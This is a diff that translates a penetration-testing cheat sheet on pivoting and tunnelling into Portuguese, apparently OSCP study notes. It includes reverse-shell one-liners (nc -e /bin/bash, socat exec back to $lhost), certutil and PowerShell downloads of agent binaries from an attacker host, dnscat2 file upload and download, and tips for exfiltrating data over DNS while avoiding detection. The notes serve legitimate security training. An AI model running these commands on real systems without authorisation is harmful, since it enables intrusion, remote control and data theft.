@@ -1,88 +1,88 @@
 # Pivoting & Tunneling
 
-## Table of Contents
+## Índice
 
 - [SSH Tunneling](#ssh-tunneling)
-  - [Local Port Forwarding](#local-port-forwarding)
-  - [Remote Port Forwarding](#remote-port-forwarding)
-  - [Dynamic Port Forwarding (SOCKS)](#dynamic-port-forwarding-socks)
+  - [Port Forwarding Local](#port-forwarding-local)
+  - [Port Forwarding Remoto](#port-forwarding-remoto)
+  - [Port Forwarding Dinâmico (SOCKS)](#port-forwarding-dinâmico-socks)
 - [Proxychains](#proxychains)
 - [Ligolo-ng](#ligolo-ng)
 - [Chisel](#chisel)
 - [Socat](#socat)
 - [sshuttle](#sshuttle)
-- [dnscat2 (DNS Tunneling)](#dnscat2-dns-tunneling)
-- [Metasploit Pivoting](#metasploit-pivoting)
-- [Windows Port Forwarding](#windows-port-forwarding)
+- [dnscat2 (Tunneling DNS)](#dnscat2-tunneling-dns)
+- [Pivoting com Metasploit](#pivoting-com-metasploit)
+- [Port Forwarding no Windows](#port-forwarding-no-windows)
 
 ---
 
 ## SSH Tunneling
 
-### Quick Check (One-liner)
+### Verificação Rápida (One-liner)
 
 ```shell
-# Quick SOCKS proxy setup
+# Configuração rápida de proxy SOCKS
 ssh -D 9050 -N -f $user@$pivot && proxychains nmap -sT -Pn $internal_target
 ```
 
-### Local Port Forwarding
+### Port Forwarding Local
 
-> Forward remote port to local machine
+> Encaminhar porta remota para a máquina local
 
 ```shell
-# Syntax: ssh -L <local_port>:<target_host>:<target_port> <user>@<pivot_host>
+# Sintaxe: ssh -L <porta_local>:<host_alvo>:<porta_alvo> <user>@<pivot>
 
-# Forward remote MySQL (3306) to local port 3306
+# Encaminhar MySQL remoto (3306) para porta local 3306
 ssh -L 3306:localhost:3306 $user@$pivot
 
-# Forward internal host through pivot
+# Encaminhar host interno através do pivot
 ssh -L 3306:10.10.10.5:3306 $user@$pivot
 
-# Access via localhost
+# Acessar via localhost
 mysql -u root -h 127.0.0.1 -p --skip-ssl
 ```
 
-### Remote Port Forwarding
+### Port Forwarding Remoto
 
-> Forward local port to remote machine (reverse tunnel)
+> Encaminhar porta local para máquina remota (túnel reverso)
 
 ```shell
-# Syntax: ssh -R <remote_port>:<target_host>:<target_port> <user>@<pivot_host>
+# Sintaxe: ssh -R <porta_remota>:<host_alvo>:<porta_alvo> <user>@<pivot>
 
-# Forward local port 4444 to remote port 5555
+# Encaminhar porta local 4444 para porta remota 5555
 ssh -R 5555:localhost:4444 $user@$pivot
 
-# Usage: start nc listener locally, connect to pivot:5555 from target
+# Uso: iniciar listener nc localmente, conectar ao pivot:5555 a partir do alvo
 # Local: nc -lvnp 4444
-# Target: nc $pivot 5555 -e /bin/bash
+# Alvo: nc $pivot 5555 -e /bin/bash
 
-# Forward external resource through pivot
+# Encaminhar recurso externo através do pivot
 ssh -R 5555:208.86.224.90:80 $user@$pivot
 ```
 
-### Dynamic Port Forwarding (SOCKS)
+### Port Forwarding Dinâmico (SOCKS)
 
-> Create SOCKS proxy through pivot host
+> Criar proxy SOCKS através do pivot
 
 ```shell
-# Create SOCKS proxy on local port 9050
+# Criar proxy SOCKS na porta local 9050
 ssh -D 9050 $user@$pivot
 
-# With SSH key
+# Com chave SSH
 ssh -i key.pem -D 9050 $user@$pivot
 
-# For older SSH versions
+# Para versões antigas de SSH
 ssh -D 9050 $user@$pivot -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa
 
-# Keep alive
+# Manter ativo em background
 ssh -D 9050 -N -f $user@$pivot
 ```
 
-### Combined Tunneling
+### Tunneling Combinado
 
 ```shell
-# Multiple port forwards
+# Múltiplos port forwards simultaneamente
 ssh -L 3306:localhost:3306 -L 8080:localhost:80 -D 9050 $user@$pivot
 ```
 
@@ -90,82 +90,82 @@ ssh -L 3306:localhost:3306 -L 8080:localhost:80 -D 9050 $user@$pivot
 
 ## Proxychains
 
-### Configuration
+### Configuração
 
 ```shell
-# Edit config
+# Editar configuração
 sudo nano /etc/proxychains4.conf
 ```
 
 ```ini
 # /etc/proxychains4.conf
 dynamic_chain
-# strict_chain (comment out)
+# strict_chain (comentar esta linha)
 
 [ProxyList]
 socks4 127.0.0.1 9050
 # socks5 127.0.0.1 1080
 ```
 
-### Usage
+### Uso
 
 ```shell
-# Run commands through proxy
+# Executar comandos pelo proxy
 proxychains nmap -sT -Pn -n $target
 proxychains mysql -h $target -u root
 proxychains evil-winrm -i $target -u Administrator -H <hash>
 proxychains ssh $user@$target
 proxychains curl http://$target
 
-# Multiple hops (add to config)
+# Múltiplos hops (adicionar ao config)
 socks4 127.0.0.1 9050
 socks4 127.0.0.1 9051
 ```
 
-### Verify Connection
+### Verificar Conexão
 
 ```shell
-# Check if tunnel is active
+# Verificar se o tunnel está ativo
 ss -lntp | grep 9050
 ps aux | grep "ssh -D"
-kill <PID>  # To stop tunnel
+kill <PID>  # Para parar o tunnel
 ```
 
 ---
 
 ## Ligolo-ng
 
-> **📚 For complete guide with multi-hop pivoting, port forwarding, and troubleshooting, see [Ligolo-ng Complete Guide](5.3.Ligolo-ng-Complete-Guide.md)**
+> **📚 Para guia completo com pivoting multi-hop, port forwarding e troubleshooting, veja [Guia Completo Ligolo-ng](Ligolo-ng-Complete-Guide.md)**
 
-### Quick Setup
+### Configuração Rápida
 
 ```shell
 # Download
 git clone https://github.com/nicocha30/ligolo-ng.git
 
-# Create TUN interface (Attacker)
+# Criar interface TUN (Atacante)
 sudo ip tuntap add user $(whoami) mode tun ligolo
 sudo ip link set ligolo up
 ```
 
-### Attacker (Proxy)
+### Atacante (Proxy)
 
 ```shell
-# Start proxy
+# Iniciar proxy
 sudo ./proxy -selfcert
 
-# After agent connects
+# Após agent conectar
 ligolo-ng > session
-ligolo-ng > [session ID]
+ligolo-ng > [ID da sessão]
 
-# Add route to internal network
+# Adicionar rota para rede interna
 sudo ip route add 172.16.0.0/24 dev ligolo
 
-# Start tunnel
+# Iniciar tunnel
 ligolo-ng > start
 ```
 
-### Victim (Agent)
+### Vítima (Agent)
 
 ```shell
 # Linux
@@ -175,30 +175,30 @@ ligolo-ng > start
 agent.exe -connect $lhost:11601 -ignore-cert
 ```
 
-### Advanced Commands
+### Comandos Avançados
 
 ```shell
-# List interfaces
+# Listar interfaces
 ligolo-ng > interface_list
 
-# Auto-route
+# Roteamento automático
 ligolo-ng > autoroute
 
-# Create named interface
+# Criar interface com nome
 ligolo-ng > interface_create --name "internal"
 ligolo-ng > interface_add_route --name internal --route 192.168.2.0/24
 
-# Start on specific interface
+# Iniciar em interface específica
 ligolo-ng > tunnel_start --tun ligolo
 ```
 
-### File Transfer
+### Transferência de Arquivos
 
 ```shell
-# Download (in PowerShell)
+# Download (no PowerShell)
 powershell wget -uri "http://$lhost:8000/agent.exe" -OutFile agent.exe
 
-# Or certutil
+# Ou via certutil
 certutil -urlcache -split -f "http://$lhost:8000/agent.exe" agent.exe
 ```
 
@@ -206,17 +206,16 @@ certutil -urlcache -split -f "http://$lhost:8000/agent.exe" agent.exe
 
 ## Chisel
 
-### Setup
+> **📚 Para guia completo com cenários de pivoting e troubleshooting, veja [Guia Completo Chisel](Chisel-Complete-Guide.md)**
+
+### Configuração
 
 ```shell
-# Download
-# https://github.com/jpillora/chisel/releases
-
-# Server (Attacker)
+# Servidor (Atacante)
 ./chisel server -p 8080 --reverse
 ```
 
-### Client (Victim)
+### Client (Vítima)
 
 ```shell
 # Linux
@@ -226,35 +225,34 @@ certutil -urlcache -split -f "http://$lhost:8000/agent.exe" agent.exe
 chisel.exe client $lhost:8080 R:socks
 ```
 
-### SOCKS Proxy
+### Proxy SOCKS
 
 ```shell
-# Server (Attacker)
+# Servidor (Atacante)
 ./chisel server -p 8080 --reverse
 
-# Client (Victim) - Create SOCKS proxy on attacker:1080
+# Client (Vítima) - Criar proxy SOCKS no atacante:1080
 ./chisel client $lhost:8080 R:1080:socks
 
-# Use with proxychains
-# Add to /etc/proxychains4.conf: socks5 127.0.0.1 1080
+# Usar com proxychains
+# Adicionar ao /etc/proxychains4.conf: socks5 127.0.0.1 1080
 proxychains nmap -sT -Pn $target
 ```
 
 ### Port Forwarding
 
 ```shell
-# Forward specific port
-# Server (Attacker)
+# Servidor (Atacante)
 ./chisel server -p 8080 --reverse
 
-# Client (Victim) - Forward victim:3389 to attacker:3389
+# Client (Vítima) - Encaminhar vítima:3389 para atacante:3389
 ./chisel client $lhost:8080 R:3389:127.0.0.1:3389
 
-# Connect to localhost:3389 from attacker
+# Conectar ao localhost:3389 a partir do atacante
 rdesktop 127.0.0.1
 ```
 
-### Multiple Tunnels
+### Múltiplos Tunnels
 
 ```shell
 ./chisel client $lhost:8080 R:1080:socks R:3389:127.0.0.1:3389 R:445:10.10.10.5:445
@@ -264,17 +262,17 @@ rdesktop 127.0.0.1
 
 ## Socat
 
-### Socat Port Forwarding
+### Port Forwarding com Socat
 
 ```shell
-# Forward local port 80 to remote host
+# Encaminhar porta local 80 para host remoto
 socat TCP-LISTEN:80,fork TCP:$target:80
 
-# With bind address
+# Com endereço de bind
 socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:$target:80
 ```
 
-### UDP Forwarding
+### Encaminhamento UDP
 
 ```shell
 socat UDP-LISTEN:53,fork UDP:$target:53
@@ -283,19 +281,19 @@ socat UDP-LISTEN:53,fork UDP:$target:53
 ### Relay
 
 ```shell
-# Create relay (victim)
+# Criar relay (vítima)
 socat TCP-LISTEN:3333,fork TCP:$lhost:4444
 
-# Connect chain: attacker -> victim:3333 -> lhost:4444
+# Cadeia de conexão: atacante -> vítima:3333 -> lhost:4444
 ```
 
-### TTY Shell
+### Shell TTY
 
 ```shell
-# Attacker (listener)
+# Atacante (listener)
 socat file:`tty`,raw,echo=0 TCP-L:4444
 
-# Victim (connect back)
+# Vítima (conectar de volta)
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:4444
 ```
 
@@ -303,25 +301,25 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$lhost:4444
 
 ## sshuttle
 
-> VPN over SSH - transparent proxy
+> VPN via SSH — proxy transparente
 
-### Basic Usage
+### Uso Básico
 
 ```shell
-# Proxy entire subnet
+# Proxy para toda a subnet
 sshuttle -r $user@$pivot 10.10.10.0/24
 
-# With SSH key
+# Com chave SSH
 sshuttle -r $user@$pivot 10.10.10.0/24 --ssh-cmd "ssh -i key.pem"
 
-# Exclude local network
+# Excluir rede local
 sshuttle -r $user@$pivot 10.10.10.0/24 -x 10.10.10.1
 
-# DNS through tunnel
+# DNS pelo tunnel
 sshuttle --dns -r $user@$pivot 10.10.10.0/24
 ```
 
-### Multiple Subnets
+### Múltiplas Subnets
 
 ```shell
 sshuttle -r $user@$pivot 10.10.10.0/24 172.16.0.0/16 192.168.0.0/16
@@ -329,28 +327,28 @@ sshuttle -r $user@$pivot 10.10.10.0/24 172.16.0.0/16 192.168.0.0/16
 
 ---
 
-## dnscat2 (DNS Tunneling)
+## dnscat2 (Tunneling DNS)
 
-> Tunnel traffic through DNS queries - bypasses DPI (Deep Packet Inspection)
+> Tunela tráfego via consultas DNS — bypassa DPI (Deep Packet Inspection)
 
-### Server Setup (Attacker - Kali)
+### Configuração do Servidor (Atacante - Kali)
 
 ```shell
-# Install
+# Instalar
 sudo apt install dnscat2
 
-# Start server (authoritative DNS mode - requires domain)
+# Iniciar servidor (modo DNS autoritativo — requer domínio)
 dnscat2-server $domain
 
-# Start server (direct connection mode - no domain required)
+# Iniciar servidor (modo conexão direta — sem domínio)
 dnscat2-server --dns server=127.0.0.1,port=53 --no-cache
 dnscat2-server --dns server=127.0.0.1,port=53,type=TXT --no-cache
 ```
 
-### Client (Victim - Windows)
+### Client (Vítima - Windows)
 
 ```powershell
-# PowerShell client (dnscat2-powershell)
+# Client PowerShell (dnscat2-powershell)
 # https://github.com/lukebaggett/dnscat2-powershell
 
 Import-Module .\dnscat2.ps1
@@ -358,128 +356,128 @@ Start-Dnscat2 -DNSServer $lhost -Domain $domain
 Start-Dnscat2 -DNSServer $lhost -Domain $domain -Exec cmd
 ```
 
-### Client (Victim - Linux)
+### Client (Vítima - Linux)
 
 ```shell
-# Compile client
+# Compilar client
 git clone https://github.com/iagox86/dnscat2.git
 cd dnscat2/client
 make
 
-# Connect to server (replace $lhost/$domain with actual values)
+# Conectar ao servidor
 ./dnscat --dns "server=$lhost,port=53"
 ./dnscat $domain
 ```
 
-### Server Commands
+### Comandos do Servidor
 
 ```shell
-# List sessions
+# Listar sessões
 dnscat2> sessions
 
-# Interact with session
+# Interagir com sessão
 dnscat2> session -i 1
 
-# Execute shell
+# Executar shell
 command> shell
 command> exec
 
 # Port forwarding
 command> listen 127.0.0.1:4444 $target:445
 
-# Download/Upload
+# Download/Upload de arquivos
 command> download C:\users\admin\Desktop\flag.txt
 command> upload shell.exe C:\Temp\shell.exe
 ```
 
-### DNS Tunneling Best Practices
+### Boas Práticas no Tunneling DNS
 
 ```text
-- Use subdomains for data exfiltration
-- TXT records can hold more data than A records
-- Set longer query intervals to avoid detection
-- Use --secret for encrypted tunnel
+- Usar subdomínios para exfiltração de dados
+- Registros TXT suportam mais dados que registros A
+- Definir intervalos de consulta mais longos para evitar detecção
+- Usar --secret para tunnel criptografado
 ```
 
 ---
 
-## Metasploit Pivoting
+## Pivoting com Metasploit
 
 ### Auto Route
 
 ```shell
-# In meterpreter session
+# Em sessão meterpreter
 run autoroute -s 10.10.10.0/24
 
-# Or manually
+# Ou manualmente
 run post/multi/manage/autoroute
 ```
 
-### Metasploit SOCKS Proxy
+### Proxy SOCKS com Metasploit
 
 ```shell
-# Background meterpreter session
+# Colocar sessão meterpreter em background
 background
 
-# Start SOCKS proxy
+# Iniciar proxy SOCKS
 use auxiliary/server/socks_proxy
 set SRVPORT 9050
 set VERSION 4a
 run
 
-# Use with proxychains
+# Usar com proxychains
 ```
 
 ### Port Forward
 
 ```shell
-# In meterpreter
+# No meterpreter
 portfwd add -l 3389 -p 3389 -r $target
 
-# Remove
+# Remover
 portfwd delete -l 3389 -p 3389 -r $target
 
-# List
+# Listar
 portfwd list
 ```
 
-### Upgrade Shell to Meterpreter
+### Upgrade Shell para Meterpreter
 
 ```shell
-sessions -u <session_id>
+sessions -u <id_da_sessão>
 ```
 
 ---
 
-## Windows Port Forwarding
+## Port Forwarding no Windows
 
 ### netsh
 
 ```cmd
-# Add port forward
+:: Adicionar port forward
 netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.5
 
-# List forwards
+:: Listar forwards
 netsh interface portproxy show all
 
-# Delete forward
+:: Remover forward
 netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
 
-# Reset all
+:: Resetar tudo
 netsh interface portproxy reset
 ```
 
 ### plink.exe
 
 ```cmd
-# Download via PowerShell
+:: Download via PowerShell
 powershell wget -uri "http://$lhost/plink.exe" -OutFile plink.exe
 
-# Create reverse tunnel
+:: Criar tunnel reverso
 plink.exe -ssh -l $user -pw $password -R $lport:127.0.0.1:3389 $lhost
 ```
 
-### PowerShell Port Scanner
+### Port Scanner em PowerShell
 
 ```powershell
 # Ping sweep
@@ -487,60 +485,61 @@ $ping = New-Object System.Net.Networkinformation.Ping
 1..254 | % { $ping.send("10.10.10.$_", 1) | where status -ne 'TimedOut' | select Address }
 
 # Port scan
-1..1024 | % { echo ((New-Object Net.Sockets.TcpClient).Connect("$target", $_)) "Port $_ is open" } 2>$null
+1..1024 | % { echo ((New-Object Net.Sockets.TcpClient).Connect("$target", $_)) "Porta $_ aberta" } 2>$null
 ```
 
 ---
 
 ## Double Pivoting
 
-### Scenario: Attacker → Pivot1 → Pivot2 → Target
+### Cenário: Atacante → Pivot1 → Pivot2 → Alvo
 
 ```shell
-# Step 1: SSH to Pivot1 with SOCKS
+# Passo 1: SSH para Pivot1 com SOCKS
 ssh -D 9050 user1@pivot1
 
-# Step 2: Through proxychains, SSH to Pivot2 with another SOCKS
+# Passo 2: Via proxychains, SSH para Pivot2 com outro SOCKS
 proxychains ssh -D 9051 user2@pivot2
 
-# Add both to proxychains config
+# Adicionar ambos ao config do proxychains
 # socks5 127.0.0.1 9050
 # socks5 127.0.0.1 9051
 
-# Step 3: Access target
+# Passo 3: Acessar o alvo
 proxychains nmap -sT -Pn target
 ```
 
 ---
 
-## Quick Reference
+## Referência Rápida
 
-| Tool | Use Case | Command |
+| Ferramenta | Caso de Uso | Comando |
 | ------ | ---------- | --------- |
-| SSH Local | Access remote port locally | `ssh -L 8080:target:80 user@pivot` |
-| SSH Remote | Expose local port to remote | `ssh -R 9999:localhost:22 user@pivot` |
-| SSH Dynamic | SOCKS proxy | `ssh -D 9050 user@pivot` |
-| Ligolo-ng | Full tunnel (layer 3) | `./proxy -selfcert` / `./agent -connect` |
+| SSH Local | Acessar porta remota localmente | `ssh -L 8080:target:80 user@pivot` |
+| SSH Remoto | Expor porta local para remoto | `ssh -R 9999:localhost:22 user@pivot` |
+| SSH Dinâmico | Proxy SOCKS | `ssh -D 9050 user@pivot` |
+| Ligolo-ng | Tunnel completo (camada 3) | `./proxy -selfcert` / `./agent -connect` |
 | Chisel | SOCKS + port forward | `chisel server -p 8080 --reverse` |
-| sshuttle | VPN over SSH | `sshuttle -r user@pivot 10.0.0.0/8` |
-| Proxychains | Route tools through proxy | `proxychains nmap target` |
-| Socat | Port relay | `socat TCP-LISTEN:80,fork TCP:target:80` |
+| sshuttle | VPN via SSH | `sshuttle -r user@pivot 10.0.0.0/8` |
+| Proxychains | Rotear ferramentas pelo proxy | `proxychains nmap target` |
+| Socat | Relay de porta | `socat TCP-LISTEN:80,fork TCP:target:80` |
 
 ---
 
-## See Also
+## Veja Também
 
-### Detailed Guides
+### Guias Detalhados
 
-- **[Ligolo-ng Complete Guide](5.3.Ligolo-ng-Complete-Guide.md)** - Full single/multi-hop pivoting walkthrough, troubleshooting
-- **[Lateral Movement](5.1.Lateral-Movement.md)** - PsExec, WMI, WinRM, Pass-the-Hash after pivoting
+- **[Guia Completo Ligolo-ng](Ligolo-ng-Complete-Guide.md)** - Walkthrough completo single/multi-hop, troubleshooting
+- **[Guia Completo Chisel](Chisel-Complete-Guide.md)** - Pivoting rápido com SOCKS5 e port forwarding
+- **[Movimento Lateral](Lateral-Movement.md)** - PsExec, WMI, WinRM, Pass-the-Hash após pivoting
 
-### AD Exploitation (After Pivoting)
+### Exploração de AD (Após Pivoting)
 
-- **[AD Exploitation](../3.AD-Exploit/3.1.AD-Exploitation.md)** - BloodHound, ACL abuse on internal network
-- **[Kerberos Attacks](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - Attack internal Domain Controllers
+- **[Exploração de AD](../3.AD-Exploit/3.1.AD-Exploitation.md)** - BloodHound, abuso de ACL na rede interna
+- **[Ataques Kerberos](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - Atacar Domain Controllers internos
 
-### OSCP Preparation
+### Preparação OSCP
 
-- **[Lab Walkthrough Examples](../9.OSCP-Exam/9.2.Lab-Walkthrough-Examples.md)** - AD Set pivoting example
-- **[Exam Tips](../9.OSCP-Exam/9.3.Exam-Tips-and-Tricks.md)** - Time management for AD Set
+- **[Exemplos de Laboratório](../9.OSCP-Exam/9.2.Lab-Walkthrough-Examples.md)** - Exemplo de pivoting no AD Set
+- **[Dicas do Exame](../9.OSCP-Exam/9.3.Exam-Tips-and-Tricks.md)** - Gestão de tempo no AD Set
